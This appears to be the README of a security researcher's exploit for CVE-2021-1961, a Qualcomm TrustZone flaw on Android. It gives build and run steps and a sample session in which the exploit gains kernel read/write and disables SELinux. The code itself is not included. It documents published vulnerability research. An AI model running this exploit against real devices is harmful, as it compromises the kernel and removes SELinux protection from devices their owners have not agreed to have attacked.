Exploit code for CVE-2021-1961. Full write-up is available
[on my blog](https://tamirzb.com/attacking-android-kernel-using-qualcomm-trustzone).

In order to build the exploit, run Android NDK's `ndk-build`.

In order to run the exploit, you need to have access to `/dev/qseecom`, which
means having the right user/group and the right SELinux context. This can be
done either on a debug image using the command `su system`, or on a stock image
patched with [Magisk](https://github.com/topjohnwu/Magisk) using the command
`su - system`.

Here is an example of running the exploit on a stock image patched with Magisk:

```bash
$ adb push qseecom_exploit /data/local/tmp
$ adb shell
blueline:/ $ cd /data/local/tmp
blueline:/data/local/tmp $ su - system
blueline:/data/local/tmp $ id
uid=1000(system) gid=1000(system) groups=1000(system) context=u:r:magisk:s0
blueline:/data/local/tmp $ getenforce
Enforcing
blueline:/data/local/tmp $ ./qseecom_exploit
[+] Setup widevine
[+] Got a 32 bit addresses ION
[+] Setup exploit kernel r/w
[+] Found kallsyms_token_table marker
[+] Found all kallsyms data
[+] Kernel virtual base address: 0xffffff9b9b080000
[+] Modified /proc/version
[+] Disabled SELinux
blueline:/data/local/tmp $ cat /proc/version
*modified*
blueline:/data/local/tmp $ getenforce
Permissive
```
